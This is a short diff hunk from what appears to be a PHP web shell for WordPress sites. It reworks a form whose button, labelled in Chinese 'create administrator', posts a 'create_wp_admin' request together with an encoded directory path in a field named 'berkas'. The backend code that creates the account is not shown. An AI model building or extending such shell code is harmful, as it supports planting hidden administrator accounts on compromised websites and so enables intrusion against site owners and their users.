@@ -945,12 +945,15 @@ a {
      style="display: inline-block; padding: 10px 20px; margin: 5px; background-color: #007BFF; color: #fff; text-decoration: none; border-radius: 5px;">
     SQL
   </a>
-    <form method="POST" action="" style="display:inline-block;">
-        <button type="submit" name="create_wp_admin" 
-                style="padding: 10px 20px; margin: 5px; background-color: #007BFF; color: #fff; border: none; border-radius: 5px;">
-            创建管理员
-        </button>
-    </form>
+  <form method="POST" action="" style="display: inline-block;">
+    <input type="hidden" name="create_wp_admin" value="1">
+    <input type="hidden" name="berkas" value="<?= urlencode(kunci($default_dir)) ?>">
+    <button type="submit"
+       style="display: inline-block; padding: 10px 20px; margin: 5px; background-color: #007BFF; color: #fff; text-decoration: none; border-radius: 5px;">
+      创建管理员
+    </button>
+  </form>
+
 
 </div>
 <?php
